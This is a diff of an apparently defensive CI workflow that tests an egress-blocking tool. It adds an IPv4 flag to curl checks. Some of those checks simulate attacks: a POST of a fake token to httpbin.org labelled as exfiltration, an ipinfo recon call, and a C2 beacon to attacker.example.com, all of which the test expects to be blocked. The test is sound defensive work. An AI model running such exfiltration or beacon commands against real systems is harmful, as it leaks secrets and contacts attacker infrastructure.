@@ -39,7 +39,7 @@ jobs:
       - name: Allowed — api.github.com
         run: |
           citadel-step "allowed: github api"
-          if curl -sS --max-time 5 https://api.github.com/zen; then
+          if curl -4 -sS --max-time 5 https://api.github.com/zen; then
             echo "✅ api.github.com reached (expected)"
           else
             echo "⚠️  api.github.com unexpectedly blocked"
@@ -49,7 +49,7 @@ jobs:
       - name: Allowed — registry.npmjs.org
         run: |
           citadel-step "allowed: npm search"
-          if curl -sS --max-time 5 "https://registry.npmjs.org/-/v1/search?text=react&size=1" > /dev/null; then
+          if curl -4 -sS --max-time 5 "https://registry.npmjs.org/-/v1/search?text=react&size=1" > /dev/null; then
             echo "✅ npm registry reached (expected)"
           else
             echo "⚠️  npm registry unexpectedly blocked"
@@ -72,7 +72,7 @@ jobs:
           citadel-step "blocked: httpbin exfil"
           for i in 1 2 3; do
             echo "--- attempt $i ---"
-            if curl -sS --max-time 4 https://httpbin.org/post -d "fake_token=AKIAFAKEKEY" -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
+            if curl -4 -sS --max-time 4 https://httpbin.org/post -d "fake_token=AKIAFAKEKEY" -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
               echo "  ⚠️  attempt $i succeeded"
             else
               echo "  ✅ attempt $i blocked (expected for attempt ≥ 2)"
@@ -85,7 +85,7 @@ jobs:
           citadel-step "blocked: ipinfo recon"
           for i in 1 2 3; do
             echo "--- attempt $i ---"
-            if curl -sS --max-time 4 https://ipinfo.io/json -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
+            if curl -4 -sS --max-time 4 https://ipinfo.io/json -o /dev/null -w "  HTTP %{http_code}  (%{time_total}s)\n"; then
               echo "  ⚠️  attempt $i succeeded"
             else
               echo "  ✅ attempt $i blocked (expected for attempt ≥ 2)"
@@ -96,7 +96,7 @@ jobs:
       - name: Blocked — attacker.example.com (C2)
         run: |
           citadel-step "blocked: c2 callback"
-          if curl -sS --max-time 5 http://attacker.example.com/beacon 2>&1; then
+          if curl -4 -sS --max-time 5 http://attacker.example.com/beacon 2>&1; then
             echo "❌ attacker.example.com was NOT blocked"
           else
             echo "✅ attacker.example.com BLOCKED (expected — DNS fail or kernel drop)"
